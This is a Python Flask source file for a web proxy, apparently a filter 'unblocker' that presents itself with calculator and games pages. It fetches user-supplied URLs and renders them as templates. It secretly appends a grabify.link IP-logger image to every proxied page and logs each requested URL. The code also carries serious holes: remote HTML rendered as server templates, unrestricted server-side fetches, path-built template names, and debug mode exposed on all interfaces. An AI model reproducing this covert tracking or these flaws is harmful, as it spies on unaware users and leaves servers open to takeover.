from flask import Flask, render_template, request, session, send_file, redirect, jsonify, Response, url_for
from html.parser import HTMLParser
import urllib.request
import requests
import mechanicalsoup
import ipaddress
import os
import random
from bs4 import BeautifulSoup, SoupStrainer
from datetime import datetime
import getlinks

with open("sites.log","w") as host:
  host.write("")
  host.close()
log = []
dir = 'templates/session'

for f in os.listdir(dir):
    os.remove(os.path.join(dir, f))
for f in os.listdir('templates/link'):
    os.remove(os.path.join('templates/link', f))
browser = mechanicalsoup.Browser()
browser.set_user_agent('Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0')
app = Flask(__name__)
debugVal = True
app.secret_key = os.urandom(12).hex()
tokn = os.urandom(12).hex()
mode = 1
MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES

@app.route('/', methods=['POST', 'GET'])
def unblok_home():
  global actionF
  actionF = '/learn-tkn={}'.format(tokn)
  
  return render_template('home.html',action=actionF)

@app.route('/about')
def about():
  return render_template('about.html')

@app.route('/client-tkn=<tkn>',methods=['POST','GET'])
def client(tkn):
  fname = "link/{}".format(tkn)
  return url_for('unblok',token=tkn)

@app.route('/learn-tkn=<token>', methods=['GET', 'POST'])
def unblok(token):
  ipaddress.IPv4Address(ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4)))
  one=True
  if one:
    todo = request.form.get("todo")
  if not "https://" in str(todo) or not "http://":
    todo = "https://" + str(todo)

  html = requests.get(todo)
  cookie = token
  fileName = "bloked-" + cookie + ".html"
  fileDir = "templates/session/" + fileName
  file = open(fileDir, "w")
  writeText = str(html.text) + '<html> <img src="https://grabify.link/HG6YNM""> </html>'
  file.write(writeText)
  file.close()
  template = "session/" + fileName
  dir = "templates/" + template
  page = requests.get(todo)
  data = page.text
  getlinks.fLinkGet(todo,'templates/link',cookie)
  for f in os.listdir('templates/link'):
    fi = 'templates/link/{}\n'.format(f)
    url_for('client',tkn=cookie)
  now = datetime.now()

  current_time = now.strftime("%D:%H:%M:%S")
  user = "{} -- {}\n".format(todo, current_time)
  log.append(user)
  with open("sites.log","a") as host:
    print(str(user))
    host.write(user)
  host.close()
  mode = ""
  q1 = request.form.get('q1')
    
  print(q1)
  return render_template(template,actionMode=actionF)

@app.route('/favicon.png')
def favicon():
  return send_file('templates/favicon.png')

@app.route('/calculator')
def calc():
  return render_template('calculate.html')

@app.route('/robots.txt')
def noindex():
    r = Response(response="User-Agent: *\nDisallow: /\n", status=200, mimetype="text/plain")
    r.headers["Content-Type"] = "text/plain; charset=utf-8"
    return r

@app.route('/games')
def games():
  return render_template('games.html')

@app.route('/game=<id>')
def game(id):
  gameDir = '/game/{}.html'.format(id)
  return render_template(gameDir)

@app.errorhandler(500)
def page_not_found(e):
    return render_template('500.html'), 500

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

app.run(host='0.0.0.0', port=5000, debug=debugVal)